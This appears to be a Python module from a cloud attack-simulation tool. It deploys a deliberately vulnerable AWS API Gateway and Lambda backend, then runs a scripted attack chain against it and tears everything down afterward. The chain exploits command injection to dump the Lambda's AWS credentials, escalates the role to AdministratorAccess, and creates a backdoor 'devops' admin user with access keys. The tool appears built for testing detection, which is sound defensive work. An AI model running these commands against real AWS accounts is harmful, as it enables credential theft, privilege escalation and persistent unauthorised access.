import os
import pyfiglet
import time
import subprocess
import json
from tqdm import tqdm
from time import sleep
from termcolor import colored
from core.helpers import generate_ssh_key
from core.helpers import loading_animation
from .report.report import gen_report_2

def scenario_2_destroy():
    with open("./core/aws-scenario-2-output.json", "r") as file:
        data = json.load(file)
    
    LAMBDA_ROLE_NAME = data["lambda-role-name"]

    print(colored("Deleting Manually Created resources - resources which are not tracked by Pulumi's State", color="red"))
    loading_animation()
    print("-"*30)
    
    subprocess.call("aws iam detach-user-policy --user-name devops --policy-arn arn:aws:iam::aws:policy/AdministratorAccess", shell=True)
    subprocess.call("aws iam list-access-keys --user-name devops | jq -r '.AccessKeyMetadata[0].AccessKeyId' | xargs -I {} aws iam delete-access-key --user-name devops --access-key-id {}", shell=True)
    subprocess.call("aws iam delete-user --user-name devops", shell=True)

    subprocess.call("aws iam list-role-policies --role-name "+LAMBDA_ROLE_NAME+" | jq -r '.PolicyNames[]' | xargs -I {} aws iam delete-role-policy --role-name "+LAMBDA_ROLE_NAME+" --policy-name {}", shell=True)
    subprocess.call("aws iam detach-role-policy --role-name "+LAMBDA_ROLE_NAME+" --policy-arn arn:aws:iam::aws:policy/AdministratorAccess", shell=True)

    subprocess.call("cd ./scenarios/scenario_2/infra/ && pulumi destroy -s aws-scenario-2 --yes", shell=True)


def scenario_2_execute():
    print("-"*30)
    print(colored("Executing Scenraio 2 : Rest API exploit - command injection, credential exfiltration from backend lambda and privilige escalation, rogue identity creation & persistence ", color="red"))

    print(colored("Rolling out Infra", color="red"))
    loading_animation()
    print("-"*30)

    file_path = "./core/aws-scenario-2-output.json"
    if os.path.exists(file_path):
        os.remove(file_path)
        print("File '{}' found and deleted.".format(file_path))
    else:
        print("File '{}' not found.".format(file_path))

    subprocess.call("cd ./scenarios/scenario_2/infra/ && pulumi up -s aws-scenario-2 -y", shell=True)
    subprocess.call("cd ./scenarios/scenario_2/infra/ && pulumi stack -s aws-scenario-2 output --json >> ../../../core/aws-scenario-2-output.json", shell=True)

    with open("./core/aws-scenario-2-output.json", "r") as file:
        data = json.load(file)

    API_GW_URL = data["apigateway-rest-endpoint"]
    LAMBDA_ROLE_NAME = data["lambda-role-name"]
    API_GW_ID = data["api-gateway-id"]
    LAMBDA_FUNC_ARN = data["lambda-func-name"]

    print(colored("Exploiting the Application on API GW", color="red"))
    loading_animation()
    print("-"*30)   

    print(colored("Detected OS Injection through API GW, lambda backend, attempting credential exfil", color="red"))
    loading_animation()
    print("-"*30)   

    subprocess.call("curl '"+API_GW_URL+"?query=env' | grep -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN >> token.txt", shell=True)
    print(colored("Successfuly Exifiltrated Lambda Role Creds", color="red"))
    loading_animation()
    print("-"*30)   

    creds = "export $(grep -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN token.txt)"
    subprocess.call(""+creds+" && aws sts get-caller-identity --no-cli-pager", shell=True)
    
    print(colored("PrivEsc possible through this credential, Escalating role privileges", color="red"))
    subprocess.call(""+creds+" && aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name "+LAMBDA_ROLE_NAME+"", shell=True)
    sleep_duration = 60
    with tqdm(total=sleep_duration, desc="Loading") as pbar:
        # Loop until sleep_duration is reached
        while sleep_duration > 0:
            # Sleep for a shorter interval to update the progress bar
            sleep_interval = min(1, sleep_duration)
            sleep(sleep_interval)
            
            # Update the progress bar with the elapsed time
            pbar.update(sleep_interval)
            sleep_duration -= sleep_interval

    #subprocess.call("curl '"+API_GW_URL+"?query=ping'", shell=True)

    #Backdoor IAM User
    print(colored("Creating a Backdoor User which can be used by the attacker", color="red"))
    loading_animation()
    print("-"*30)
    subprocess.call(""+creds+" && aws iam create-user --user-name devops --no-cli-pager", shell=True)
    subprocess.call(""+creds+" && aws iam attach-user-policy --user-name devops --policy-arn arn:aws:iam::aws:policy/AdministratorAccess", shell=True)
    subprocess.call(""+creds+" && aws iam create-access-key --user-name devops --no-cli-pager", shell=True)


    #Backdoor Role
    # print(colored("Creating a Backdoor Role which can be assumed from custom AWS account", color="red"))
    # loading_animation()
    # print("-"*30)
    # subprocess.call(""+creds+" && aws iam create-role --role-name monitoring-metrics --assume-role-policy-document file://infra/scenario-2/assume-role-trust-policy.json", shell=True)
    # subprocess.call(""+creds+" && aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name monitoring-metrics", shell=True)


    gen_report_2(API_GW_ID, LAMBDA_FUNC_ARN, API_GW_URL, LAMBDA_ROLE_NAME)

    subprocess.call("rm token.txt", shell=True)